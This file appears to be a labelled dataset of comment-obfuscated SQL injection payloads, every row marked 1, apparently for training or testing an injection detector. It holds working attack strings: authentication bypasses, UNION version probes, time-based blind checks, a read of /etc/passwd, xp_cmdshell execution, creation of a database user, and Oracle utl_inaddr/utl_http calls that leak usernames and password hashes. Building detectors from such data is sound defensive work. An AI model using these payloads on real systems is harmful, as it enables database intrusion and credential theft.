Query,Label
/**/o/**/r/**/1/**/  =  /**/1,1
" se/**/lect * f/**/rom users whe/**/re id  =  1 o/**/r "".  (  "" o/**/r 1  =  1 -- 1",1
" s/**/elect * fr/**/om users whe/**/re id  =  '1' union s/**/elect ||/1,version  (    )   -- 1'",1
" selec/**/t * f/**/rom users w/**/here id  =  '1' union s/**/elect +\.,@@VERSION -- 1'",1
o/**/r 1  =  1/*,1
%27 o/**/r 1  =  1,1
" selec/**/t * f/**/rom users w/**/here id  =  1 <@&@ union selec/**/t 1,version  (    )   -- 1",1
" se/**/lect * fr/**/om users wh/**/ere id  =  '1' union se/**/lect $*$,@@VERSION -- 1'",1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1
" se/**/lect * f/**/rom users w/**/here id  =  '1' o/**/r $ 1  =  1 union se/**/lect 1,@@VERSION -- 1'",1
selec/**/t * fr/**/om users whe/**/re id  =  1 o/**/r \.<1 o/**/r 1  =  1 -- 1,1
" se/**/lect * f/**/rom users w/**/here id  =  '1' o/**/r \<\ union s/**/elect 1,@@VERSION -- 1'",1
" selec/**/t * fr/**/om users whe/**/re id  =  1 union s/**/elect 1||1,version  (    )   -- 1",1
" selec/**/t * fr/**/om users wher/**/e id  =  1 ||1 union selec/**/t n/**/ull,banner f/**/rom v$version wh/**/ere rownum  =  1 -- 1",1
sel/**/ect * f/**/rom users whe/**/re id  =  '1' o/**/r \.<\ o/**/r 1  =  1 -- 1',1
" s/**/elect * f/**/rom users w/**/here id  =  1 o/**/r ""]{"" o/**/r 1  =  1 -- 1",1
" selec/**/t * fro/**/m users w/**/here id  =  1 o/**/r "".@"" o/**/r 1  =  1 -- 1",1
" sel/**/ect * fr/**/om users w/**/here id  =  1 o/**/r ""$["" o/**/r 1  =  1 -- 1",1
o/**/r 1 --',1
" sel/**/ect * f/**/rom users whe/**/re id  =  1 o/**/r "",;"" o/**/r 1  =  1 -- 1",1
"admi/**/n"" o/**/r 1  =  1#",1
" se/**/lect * fr/**/om users wher/**/e id  =  1 +  (  1  )   union selec/**/t nu/**/ll,banner fr/**/om v$version w/**/here rownum  =  1 -- 1",1
\x27UNION S/**/ELECT,1
PRI/**/NT,1
" selec/**/t * f/**/rom users whe/**/re id  =  '1' union s/**/elect   (  \.  )  ,@@VERSION -- 1'",1
o/**/r 1  =  1--,1
1 o/**/r pg_sleep  (  __TIME__  )  --,1
" se/**/lect * fr/**/om users w/**/here id  =  1 o/**/r "",#"" o/**/r 1  =  1 -- 1",1
admi/**/n'  )   o/**/r   (  '1'  =  '1'/*,1
o/**/r 2 bet/**/ween 1 a/**/nd 3,1
" selec/**/t * fro/**/m users whe/**/re id  =  1 o/**/r ""  )  .""  =  1 o/**/r 1  =  1 -- 1",1
" s/**/elect * fr/**/om users wh/**/ere id  =  1 o/**/r 1#"". union s/**/elect nul/**/l,version  (    )   -- 1",1
admi/**/n' o/**/r '1'  =  '1,1
; if no/**/t  (  selec/**/t system_user  )   <> 'sa' waitfo/**/r delay '0:0:2' --,1
" se/**/lect * fr/**/om users wh/**/ere id  =  1 union selec/**/t 1,banner fr/**/om v$version whe/**/re rownum  =  1 -- 1",1
""" o/**/r 0  =  0 --",1
" sel/**/ect * fr/**/om users wh/**/ere id  =  1 union se/**/lect @ $_,version  (    )   -- 1",1
selec/**/t * fr/**/om users w/**/here id  =  1 <@.$ o/**/r 1  =  1 -- 1,1
" sel/**/ect * fr/**/om users wher/**/e id  =  1 o/**/r ""%."" o/**/r 1  =  1 -- 1",1
" sel/**/ect * f/**/rom users w/**/here id  =  1 + $+*$ union se/**/lect n/**/ull,@@VERSION -- 1",1
" sel/**/ect * fro/**/m users wher/**/e id  =  1 o/**/r "",."" o/**/r 1  =  1 -- 1",1
char%4039%41%2b%40SELE/**/CT,1
" selec/**/t * f/**/rom users wh/**/ere id  =  1 o/**/r ""1&"" o/**/r 1  =  1 -- 1",1
admi/**/n'  )   o/**/r   (  '1'  =  '1,1
declare @s varchar   (  200  )   sele/**/ct @s   =   0x73656c6 ...,1
"o/**/r 0  =  0 #""",1
" selec/**/t * fr/**/om users w/**/here id  =  1 o/**/r "".]"" o/**/r 1  =  1 -- 1",1
  )   o/**/r   (  'x'  =  'x,1
" selec/**/t * f/**/rom users wh/**/ere id  =  1.<@$ union selec/**/t 1,version  (    )   -- 1",1
$  (  sleep 50  ) ,1
" s/**/elect * fr/**/om users whe/**/re id  =  1 *1 union sele/**/ct nul/**/l,banner fro/**/m v$version wher/**/e rownum  =  1 -- 1",1
"1 union all sele/**/ct 1,2,3,4,5,6,name fro/**/m sysobjects w/**/here xtype   =   'u' --",1
" selec/**/t * fro/**/m users w/**/here id  =  1 o/**/r 1#"". union se/**/lect 'a',version  (    )   -- 1",1
" se/**/lect * fro/**/m users wher/**/e id  =  1 o/**/r 1#""; union sel/**/ect nu/**/ll,version  (    )   -- 1",1
" sel/**/ect * fr/**/om users wher/**/e id  =  1 o/**/r 1#""? o/**/r 1  =  1 -- 1",1
"""a"""" o/**/r 1  =  1--""",1
" sele/**/ct * fro/**/m users wh/**/ere id  =  1 *1 union sel/**/ect 1,banner f/**/rom v$version w/**/here rownum  =  1 -- 1",1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SELE/**/CT DI/**/STI/**/NCT  (  column_name  )   FRO/**/M   (  SELEC/**/T DI/**/STI/**/NCT  (  column_name  )  , ROWNUM AS L/**/IMIT FR/**/OM all_tab_columns  )   WHER/**/E LIM/**/IT  =  4   )    )    AN/**/D 'i'  =  'i",1
" s/**/elect * f/**/rom users whe/**/re id  =  '1' union selec/**/t   (  \  )  ,@@VERSION -- 1'",1
1 a/**/nd user_name  (    )     =   'dbo',1
"; if n/**/ot  (  substri/**/ng   (    (   selec/**/t @@version  )  ,24,1  )   <> 1  )   waitfo/**/r delay '0:0:2' --",1
" selec/**/t * fr/**/om users w/**/here id  =  1 o/**/r 1#""$ union sele/**/ct 1,version  (    )   -- 1",1
" selec/**/t * fr/**/om users wher/**/e id  =  1 o/**/r 1#""{ union sele/**/ct nul/**/l,version  (    )   -- 1",1
se/**/lect * fr/**/om users whe/**/re id  =  '1' *$ . o/**/r 1  =  1 -- 1',1
sele/**/ct * fr/**/om users wher/**/e id  =  1 +$+. o/**/r 1  =  1 -- 1,1
s/**/elect * fro/**/m users wh/**/ere id  =  1 o/**/r   (  \+  )    =  1 o/**/r 1  =  1 -- 1,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SELEC/**/T DI/**/STI/**/NCT  (  USERNAME  )   F/**/ROM   (  SE/**/LECT DI/**/STI/**/NCT  (  USERNAME  )  , ROWNUM AS LIMI/**/T F/**/ROM SYS.ALL_USERS  )   WHE/**/RE LIMI/**/T  =  6   )    )    A/**/ND 'i'  =  'i",1
o/**/r 1  =  1 o/**/r ''  =  ',1
sel/**/ect * fro/**/m users wher/**/e id  =  1   o/**/r 1  =  1 -- 1,1
o/**/r 'text' > 't',1
"1234 "" A/**/ND 1  =  0 UNION ALL S/**/ELECT ""admi/**/n"", ""81dc9bdb52d04dc20036dbd8313ed055",1
" sele/**/ct * fro/**/m users wher/**/e id  =  1 o/**/r ""%["" o/**/r 1  =  1 -- 1",1
" selec/**/t * fro/**/m users w/**/here id  =  1 o/**/r 1#"";  =  1 union sele/**/ct 1,version  (    )   -- 1",1
admi/**/n' o/**/r '1'  =  '1'#,1
selec/**/t * fr/**/om users w/**/here id  =  1 +$ 1 o/**/r 1  =  1 -- 1,1
s,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT DI/**/STI/**/NCT  (  USERNAME  )   F/**/ROM   (  SEL/**/ECT DI/**/STI/**/NCT  (  USERNAME  )  , ROWNUM AS LIMI/**/T FR/**/OM SYS.ALL_USERS  )   WHER/**/E LI/**/MIT  =  4   )    )    A/**/ND 'i'  =  'i",1
 se/**/lect * f/**/rom i/**/nfo/**/rmation_schema.ta/**/bles--,1
" sel/**/ect * f/**/rom users whe/**/re id  =  1 o/**/r ""$&"" o/**/r 1  =  1 -- 1",1
1   )    )    o/**/r pg_sleep  (  __TIME__  )  --,1
" s/**/elect * fr/**/om users wh/**/ere id  =  '1' union se/**/lect !<@,version  (    )   -- 1'",1
declare @q nvarchar   (  200  )   selec/**/t @q   =   0x770061 ...,1
 o/**/r 1  =  1 o/**/r ''  =  ',1
se/**/lect * f/**/rom users wh/**/ere id  =  1 %!<1 o/**/r 1  =  1 -- 1,1
declare @q nvarchar   (  200  )   sel/**/ect @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1
" selec/**/t * fr/**/om users w/**/here id  =  1 o/**/r ""]1"" o/**/r 1  =  1 -- 1",1
" s/**/elect * fr/**/om users w/**/here id  =  1 o/**/r $+<1 union sele/**/ct 1,@@VERSION -- 1",1
o/**/r 'unusual'   =   'unusual',1
 o/**/r 1 i/**/n   (  selec/**/t @@version  )  --,1
t/**/runcate,1
as,1
 o/**/r 3  =  3 --,1
" sele/**/ct * fr/**/om users wher/**/e id  =  1 ||1 union selec/**/t 1,banner fro/**/m v$version wh/**/ere rownum  =  1 -- 1",1
" s/**/elect * fro/**/m users whe/**/re id  =  1 <@$$ union se/**/lect 1,version  (    )   -- 1",1
"admi/**/n""  )   o/**/r   (  ""1""  =  ""1",1
" se/**/lect * fr/**/om users wh/**/ere id  =  1 o/**/r 1#""@ union se/**/lect 'a',version  (    )   -- 1",1
"1  )   o/**/r benchmark  (  10000000,MD5  (  1   )    )   #",1
" sel/**/ect * fr/**/om users wher/**/e id  =  1 union s/**/elect .1_,version  (    )   -- 1",1
 A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT SYS.DATABAS/**/E_NAME FRO/**/M DUAL   )    )    AN/**/D 'i'  =  'i,1
" o/**/r 0  =  0 #""",1
se/**/lect * fr/**/om users wh/**/ere id  =  1 %$ 1 o/**/r 1  =  1 -- 1,1
sel/**/ect * fro/**/m users w/**/here id  =  1 %!<@ o/**/r 1  =  1 -- 1,1
"; if no/**/t  (  substri/**/ng   (    (   sel/**/ect @@version  )  ,25,1  )   <> 0  )   waitfo/**/r delay '0:0:2' --",1
1  )   o/**/r sleep  (  __TIME__  )  #,1
" s/**/elect * f/**/rom users whe/**/re id  =  1 o/**/r ""1_"" o/**/r 1  =  1 -- 1",1
" s/**/elect * fro/**/m users wh/**/ere id  =  1 <1## union se/**/lect 1,version  (    )   -- 1",1
" se/**/lect * f/**/rom users wher/**/e id  =  1 + $+*\ union selec/**/t nu/**/ll,@@VERSION -- 1",1
selec/**/t * f/**/rom users wh/**/ere id  =  1. <@ o/**/r 1  =  1 -- 1,1
 o/**/r true--,1
; execute immediate 'sel' || 'ect us' || 'er',1
hi' o/**/r 'x'  =  'x';,1
selec/**/t * fro/**/m users wh/**/ere id  =  1 <@ o/**/r 1  =  1 -- 1,1
" se/**/lect * fr/**/om users wher/**/e id  =  1 o/**/r "".,"" o/**/r 1  =  1 -- 1",1
admi/**/n' #,1
" s/**/elect * fro/**/m users whe/**/re id  =  1 <@$_ union selec/**/t 1,version  (    )   -- 1",1
" sel/**/ect * f/**/rom users whe/**/re id  =  1 o/**/r "",  (  "" o/**/r 1  =  1 -- 1",1
" se/**/lect * fr/**/om users wher/**/e id  =  1 o/**/r "",{"" o/**/r 1  =  1 -- 1",1
" union se/**/lect 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1
"""  )  ;waitfo/**/r delay '0:0:__TIME__'--",1
 o/**/r 'unusual'   =   'unusual',1
"i/**/ns/**/ert i/**/nto mysql.user   (  user, host, passwo/**/rd  )   v/**/alues   (  'name', 'localhost', passwo/**/rd  (  'pass123'   )    )   ",1
"admi/**/n"" o/**/r ""1""  =  ""1""/*",1
" sel/**/ect * f/**/rom users w/**/here id  =  1 o/**/r ""1  (  ""  =  1 o/**/r 1  =  1 -- 1",1
" sel/**/ect * fr/**/om users w/**/here id  =  1 o/**/r \<1 union sel/**/ect 1,@@VERSION -- 1",1
li/**/ke,1
o/**/r username l/**/ike char  (  37  )  ;,1
 )    )    o/**/r pg_sleep  (  __TIME__  )  --,1
s/**/elect * f/**/rom users wher/**/e id  =  1 o/**/r $+<\ o/**/r 1  =  1 -- 1,1
o/**/r 3  =  3,1
" sel/**/ect * f/**/rom users whe/**/re id  =  1 o/**/r ""  (  ."" o/**/r 1  =  1 -- 1",1
selec/**/t * fr/**/om users wher/**/e id  =  1 o/**/r   (  $+  )    =  1 o/**/r 1  =  1 -- 1,1
exec sp,1
" sel/**/ect * fro/**/m users whe/**/re id  =  1 o/**/r \+<$ union s/**/elect 1,@@VERSION -- 1",1
sele/**/ct * f/**/rom users wh/**/ere id  =  1 o/**/r \<$ o/**/r 1  =  1 -- 1,1
" sel/**/ect * fro/**/m users whe/**/re id  =  1.&&1 union se/**/lect 1,version  (    )   -- 1",1
admi/**/n' o/**/r 1  =  1/*,1
a' waitfo/**/r delay '0:0:10'--,1
" se/**/lect * fr/**/om users whe/**/re id  =  1 +  (  \  )   union s/**/elect nu/**/ll,@@VERSION -- 1",1
" sele/**/ct * fr/**/om users wher/**/e id  =  1 union s/**/elect .1$_,version  (    )   -- 1",1
an/**/d 1 i/**/n   (  s/**/elect var f/**/rom temp  )  --,1
hi'  )   o/**/r   (  'a'  =  'a,1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SELEC/**/T DI/**/STI/**/NCT  (  column_name  )   FR/**/OM   (  SELEC/**/T DI/**/STI/**/NCT  (  column_name  )  , ROWNUM AS L/**/IMIT FRO/**/M all_tab_columns  )   WHE/**/RE LIM/**/IT  =  1   )    )    AN/**/D 'i'  =  'i",1
"admi/**/n"" o/**/r 1  =  1",1
"""  )   o/**/r true--",1
" se/**/lect * fro/**/m users wher/**/e id  =  '1' o/**/r $ .  =  1 union selec/**/t 1,@@VERSION -- 1'",1
" selec/**/t * fr/**/om users w/**/here id  =  1 o/**/r ""  (  {"" o/**/r 1  =  1 -- 1",1
1  )   o/**/r pg_sleep  (  __TIME__  )  --,1
" sel/**/ect * fro/**/m users wher/**/e id  =  1 o/**/r ""{."" o/**/r 1  =  1 -- 1",1
"""  )   o/**/r sleep  (  __TIME__  )    =  """,1
s/**/elect * f/**/rom users wh/**/ere id  =  1.<@. o/**/r 1  =  1 -- 1,1
"admi/**/n""  )   o/**/r   (  ""1""  =  ""1""--",1
" sel/**/ect * fro/**/m users wh/**/ere id  =  1<@.. union sele/**/ct 1,version  (    )   -- 1",1
; exec xp_regread,1
" se/**/lect * fro/**/m users whe/**/re id  =  '1' + @ 1 union selec/**/t 1,version  (    )   -- 1'",1
s/**/elect * f/**/rom users w/**/here id  =  1 + \+%1 o/**/r 1  =  1 -- 1,1
" s/**/elect * fr/**/om users whe/**/re id  =  1 o/**/r "";1"" o/**/r 1  =  1 -- 1",1
" selec/**/t * fro/**/m users whe/**/re id  =  1 o/**/r ""%&"" o/**/r 1  =  1 -- 1",1
1 a/**/nd 1  =  1,1
o/**/r 0  =  0 #,1
union sele/**/ct * fr/**/om users wher/**/e logi/**/n   =   char ...,1
" se/**/lect * f/**/rom users wh/**/ere id  =  1 union se/**/lect 1||@,version  (    )   -- 1",1
admi/**/n'  )   o/**/r '1'  =  '1'--,1
1;SELE/**/CT *,1
" selec/**/t * fro/**/m users wh/**/ere id  =  1 o/**/r ""{;"" o/**/r 1  =  1 -- 1",1
x' an/**/d 1  =    (  sele/**/ct count  (  *  )   fr/**/om tabname  )  ; --,1
" se/**/lect * fro/**/m users wh/**/ere id  =  '1' o/**/r """"<@ union s/**/elect 1,version  (    )   -- 1'",1
" sel/**/ect * fro/**/m users wh/**/ere id  =  1 o/**/r ""?,"" o/**/r 1  =  1 -- 1",1
" sel/**/ect * f/**/rom users wher/**/e id  =  '1' ||1 union s/**/elect 1,banner fr/**/om v$version wher/**/e rownum  =  1 -- 1'",1
"1 o/**/r benchmark  (  10000000,MD5  (  1   )    )   #",1
procedure,1
o/**/r ''  =  ',1
 AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT SYS.LOGI/**/N_USER FR/**/OM DUAL   )    )    AN/**/D 'i'  =  'i,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   S/**/ELECT DI/**/STI/**/NCT  (  USERNAME  )   F/**/ROM   (  SELE/**/CT DI/**/STI/**/NCT  (  USERNAME  )  , ROWNUM AS L/**/IMIT F/**/ROM SYS.ALL_USERS  )   WH/**/ERE LI/**/MIT  =  2   )    )    AN/**/D 'i'  =  'i",1
\'; d/**/esc users; --,1
" sel/**/ect * fr/**/om users wh/**/ere id  =  1 o/**/r   (  \.  )    =  1 union selec/**/t 1,@@VERSION -- 1",1
selec/**/t * f/**/rom users whe/**/re id  =  '1' o/**/r $ 1  =  1 o/**/r 1  =  1 -- 1',1
""" o/**/r """"^""",1
"""-""",1
" se/**/lect * fr/**/om users wh/**/ere id  =  1 o/**/r \<   =  1 union s/**/elect 1,@@VERSION -- 1",1
" s/**/elect * fro/**/m users w/**/here id  =  1 union sel/**/ect 1<@$,version  (    )   -- 1",1
" sel/**/ect * f/**/rom users whe/**/re id  =  1 *\ union se/**/lect nu/**/ll,@@VERSION -- 1",1
" sel/**/ect * fro/**/m users w/**/here id  =  '1' o/**/r !<@ union s/**/elect 1,version  (    )   -- 1'",1
" s/**/elect * fr/**/om users w/**/here id  =  1 o/**/r "".%"" o/**/r 1  =  1 -- 1",1
admi/**/n'/*,1
" se/**/lect * f/**/rom users w/**/here id  =  1 o/**/r ""  (  #"" o/**/r 1  =  1 -- 1",1
||UTL_HTTP.REQUEST,1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   SE/**/LECT DI/**/STI/**/NCT  (  ta/**/ble_name  )   F/**/ROM   (  SEL/**/ECT DI/**/STI/**/NCT  (  tab/**/le_name  )  , ROWNUM AS LI/**/MIT FR/**/OM sys.all_ta/**/bles  )   WH/**/ERE LIM/**/IT  =  1   )    )    AN/**/D 'i'  =  'i",1
" selec/**/t * fro/**/m users wh/**/ere id  =  '1'<@.. union s/**/elect 1,version  (    )   -- 1'",1
"""   )    )    o/**/r benchmark  (  10000000,MD5  (  1   )    )   #",1
" se/**/lect * fr/**/om users wh/**/ere id  =  1 <@.$ union sel/**/ect 1,version  (    )   -- 1",1
" sel/**/ect * fr/**/om users whe/**/re id  =  1 o/**/r $ .  =  1 union selec/**/t 1,@@VERSION -- 1",1
s/**/elect * fro/**/m users whe/**/re id  =  '1' <@.$ o/**/r 1  =  1 -- 1',1
1 uni/**/on se/**/lect all f/**/rom wh/**/ere,1
" sele/**/ct * fro/**/m users whe/**/re id  =  1 +$ . union selec/**/t nu/**/ll,@@VERSION -- 1",1
" s/**/elect * fro/**/m users wher/**/e id  =  1 o/**/r 1#""? union s/**/elect n/**/ull,version  (    )   -- 1",1
admi/**/n'  )   o/**/r '1'  =  '1'#,1
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1
o/**/r '7659'  =  '7659,1
" selec/**/t * fro/**/m users wh/**/ere id  =  1 o/**/r ""{@"" o/**/r 1  =  1 -- 1",1
" sel/**/ect * fro/**/m users whe/**/re id  =  1 union sele/**/ct +!<1,version  (    )   -- 1",1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT DI/**/STI/**/NCT  (  granted_role  )   FR/**/OM   (  SELE/**/CT DI/**/STI/**/NCT  (  granted_role  )  , ROWNUM AS LI/**/MIT FRO/**/M dba_role_privs WH/**/ERE GRANTEE  =  SYS.LOGI/**/NUSER  )   W/**/HERE LIMI/**/T  =  6   )    )    A/**/ND 'i'  =  'i",1
" sel/**/ect * fr/**/om users wh/**/ere id  =  1 o/**/r ""  (  @"" o/**/r 1  =  1 -- 1",1
o/**/r true--,1
" sel/**/ect * f/**/rom users w/**/here id  =  1 union selec/**/t !<1,version  (    )   -- 1",1
" se/**/lect * fro/**/m users wh/**/ere id  =  '1' union sele/**/ct \#,@@VERSION -- 1'",1
" selec/**/t * f/**/rom users wh/**/ere id  =  1 o/**/r 1#""{ union se/**/lect 1,version  (    )   -- 1",1
""" o/**/r true--",1
sele/**/ct * fr/**/om users wh/**/ere id  =  1. o/**/r 1  =  1 -- 1,1
" sel/**/ect * f/**/rom users whe/**/re id  =  1 o/**/r @#"",  =  1 union se/**/lect 1,version  (    )   -- 1",1
" selec/**/t * fro/**/m users wh/**/ere id  =  1 o/**/r "";@"" o/**/r 1  =  1 -- 1",1
â o/**/r 3  =  3 --,1
 A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   S/**/ELECT global_name FRO/**/M global_name   )    )    AN/**/D 'i'  =  'i,1
" sel/**/ect * f/**/rom users w/**/here id  =  1 +1 union sel/**/ect nu/**/ll,banner f/**/rom v$version wher/**/e rownum  =  1 -- 1",1
" s/**/elect * fr/**/om users whe/**/re id  =  1 o/**/r "",,""  =  1 o/**/r 1  =  1 -- 1",1
" se/**/lect * f/**/rom users whe/**/re id  =  1 + $+%1 union se/**/lect n/**/ull,@@VERSION -- 1",1
" se/**/lect * f/**/rom users wh/**/ere id  =  1 o/**/r 1#""? union sele/**/ct version  (    )  ,version  (    )   -- 1",1
" selec/**/t * fr/**/om users whe/**/re id  =  1 o/**/r ""  )  1"" o/**/r 1  =  1 -- 1",1
 o/**/r uid lik/**/e '%,1
sel/**/ect * fro/**/m users w/**/here id  =  '1' <@&1 o/**/r 1  =  1 -- 1',1
" se/**/lect * f/**/rom users w/**/here id  =  '1' union s/**/elect !<1,version  (    )   -- 1'",1
23 o/**/r 1  =  1; --,1
" selec/**/t * fro/**/m users whe/**/re id  =  1 o/**/r \<\. union selec/**/t 1,@@VERSION -- 1",1
" sele/**/ct * fr/**/om users whe/**/re id  =  1 o/**/r ""{  (  ""  =  1 o/**/r 1  =  1 -- 1",1
" selec/**/t * fro/**/m users wh/**/ere id  =  1 o/**/r ""%_"" o/**/r 1  =  1 -- 1",1
se/**/lect * f/**/rom users wher/**/e id  =  1 +   (  \.  )   o/**/r 1  =  1 -- 1,1
" sel/**/ect * fr/**/om users wher/**/e id  =  '1' union se/**/lect \,@@VERSION -- 1'",1
0 o/**/r 1  =  1,1
s/**/elect * fro/**/m users w/**/here id  =  1 &@ o/**/r 1  =  1 -- 1,1
"admi/**/n""  )   o/**/r ""1""  =  ""1",1
sel/**/ect * f/**/rom users wher/**/e id  =  1 o/**/r \<   =  1 o/**/r 1  =  1 -- 1,1
" selec/**/t * fr/**/om users w/**/here id  =  1 o/**/r ""??"" o/**/r 1  =  1 -- 1",1
" AN/**/D 1  =  utl_i/**/naddr.get_host_address   (    (   SEL/**/ECT DI/**/STI/**/NCT  (  PASSWO/**/RD  )   FRO/**/M   (  SELEC/**/T DI/**/STI/**/NCT  (  PASSWO/**/RD  )  , ROWNUM AS LI/**/MIT FR/**/OM SYS.USER$  )   WHER/**/E LI/**/MIT  =  5   )    )    A/**/ND 'i'  =  'i",1
" A/**/ND 1  =  utl_i/**/naddr.get_host_address   (    (   S/**/ELECT DI/**/STI/**/NCT  (  column_name  )   FRO/**/M   (  SE/**/LECT DI/**/STI/**/NCT  (  column_name  )  , ROWNUM AS LIMI/**/T FR/**/OM all_tab_columns  )   W/**/HERE LIMI/**/T  =  7   )    )    A/**/ND 'i'  =  'i",1
&apos; O/**/R,1
sqlvuln;,1
selec/**/t * f/**/rom users w/**/here id  =  1 + $+%$ o/**/r 1  =  1 -- 1,1
sele/**/ct * f/**/rom users wh/**/ere id  =  '1' + $+%\ o/**/r 1  =  1 -- 1',1
""" o/**/r """"*""",1
"hi o/**/r 1  =  1 --""",1
" selec/**/t * fr/**/om users wher/**/e id  =  1. union sel/**/ect n/**/ull,banner fr/**/om v$version wh/**/ere rownum  =  1 -- 1",1
; exec master..xp_cmdshell 'pi/**/ng 172.10.1.255'--,1
